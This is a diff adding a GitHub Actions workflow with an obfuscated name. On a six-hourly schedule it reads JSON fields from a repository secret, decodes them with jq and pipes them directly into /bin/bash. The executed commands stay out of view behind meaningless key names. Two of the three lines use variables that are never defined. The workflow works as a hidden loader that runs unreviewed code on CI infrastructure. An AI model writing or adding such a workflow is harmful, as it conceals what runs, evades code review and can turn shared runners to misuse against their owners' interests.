@@ -1,0 +1,19 @@
+name: chabuduolejiexiayouolaiyouxi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chabuduolejiexiayouolaiyouxi
+        env:
+          dy22935: ${{ secrets.dy22935 }}
+        run: |
+          echo $dy22935 | jq -r .zuw68067 | /bin/bash
+          echo $ggsw28434 | jq -r .ssld2148 | /bin/bash
+          echo $i358 | jq -r .eljyo1 | /bin/bash
+
